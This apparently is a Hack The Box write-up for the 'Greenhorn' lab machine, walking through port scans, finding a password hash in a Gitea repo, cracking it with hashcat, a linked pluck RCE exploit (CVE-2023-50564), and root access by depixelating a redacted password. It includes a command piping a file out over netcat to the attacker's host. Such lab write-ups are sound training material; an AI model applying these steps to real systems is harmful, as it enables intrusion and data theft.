+++
title = 'Greenhorn'
date = 2024-08-24T16:50:47-04:00
draft = false
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Easy"
+++

# Enum



## Port Scanning
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request

```


## 80/ nginx 1.18.0
```bash
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

```bash
/login.php            (Status: 200) [Size: 1242]
/images               (Status: 301) [Size: 178] [--> http://greenhorn.htb/images/]
/admin.php            (Status: 200) [Size: 4026]
/install.php          (Status: 200) [Size: 4035]
/files                (Status: 301) [Size: 178] [--> http://greenhorn.htb/files/]
/data                 (Status: 301) [Size: 178] [--> http://greenhorn.htb/data/]
/docs                 (Status: 301) [Size: 178] [--> http://greenhorn.htb/docs/]
/requirements.php     (Status: 200) [Size: 4047]

```


We find a hostname to add to our /etc/hosts `greenhorn.htb`. Checked for vhosts and didn't find any.


Powered by pluck

`login.php` file gives us a version `pluck 4.7.18`


Checking searchsploit shows a potential exploit



We need to be authenticated to run it.


## 3000/http

```bash
/admin                (Status: 303) [Size: 38] [--> /user/login]
/v2                   (Status: 401) [Size: 50]
/issues               (Status: 303) [Size: 38] [--> /user/login]
/explore              (Status: 303) [Size: 41] [--> /explore/repos]
/notifications        (Status: 303) [Size: 38] [--> /user/login]
/milestones           (Status: 303) [Size: 38] [--> /user/login]

```



No vhosts found.

Found a version on the `/admin` page


`[Powered by Gitea](https://about.gitea.com) Version: 1.21.11`

This looks to be a pretty recent version


Since we know we need a password to login as admin to the pluck app on port 80, we can check the gitea site and see if we can find any creds within the repo or within past commits.

Start by cloning the repo locally:
```bash
┌──(fish㉿kali)-[~/htb/greenhorn]
└─$ git clone http://greenhorn.htb:3000/GreenAdmin/GreenHorn.git
```



Nothing interesting there, just the one commit for the repo. Looking at documentation for pluck, we see it doesn't use a database but stores everything in files. Did the new dev upload that file as well? yep




We can crack the hash with hashcat:
```bash
┌──(fish㉿kali)-[~/htb/greenhorn/GreenHorn/files]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 1700
...
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1

```

`admin:iloveyou1` allows us to login and now we can try the rce exploit (CVE-2023-50564).

---
# Foothold

Created a python script to exploit this in one shot >> https://raw.githubusercontent.com/thefizzyfish/CVE-2023-50564-pluck/main/CVE-2023-50564.py





We can list what's in `junior`'s home dir but can't read the flag


## Exploits
CVE-2023-50564
https://github.com/thefizzyfish/CVE-2023-50564-pluck

--- 
# PrivEsc

We can't ssh into the box as junior with the `iloveyou1` password as it requires public keys.


We can switch to junior with `su`


Interesting linpeas output:


We could try replacing the gitea executable with a rev shell to pivot to the gitea user?
That might be rabbit hole as the file is busy whenever I try to replace it


Looking back at `junior`'s home directory finds an interesting pdf we can send to our box to take a look at
```bash
# On remote host
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
junior@greenhorn:~$ cat 'Using OpenVAS.pdf' | nc 10.10.14.7 1234
junior@greenhorn:~$ 

# On local host
┌──(fish㉿kali)-[~/htb/greenhorn]
└─$ nc -l -p 1234 -q 1 > 'Using OpenVAS.pdf' < /dev/null

```


Interesting but checking the file system for openvas doesn't turn anything up. We can try to depixilate the password with a tool named `depix` >> https://github.com/spipm/Depix

First extract the image from the pdf
```bash
┌──(fish㉿kali)-[~/htb/greenhorn]
└─$ pdfimages "./Using OpenVAS.pdf" greenhorn
```
Run the tool against the created image:
```bash
┌──(fish㉿kali)-[~/htb/greenhorn]
└─$ python3 Depix/depix.py -p greenhorn-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
...
2024-08-24 16:20:06,891 - Saving output image to: output.png

```


```txt
root:sidefromsidetheothersidesidefromsidetheotherside
```


And that's all folks

## Exploits


---


# Post/Pivot



---
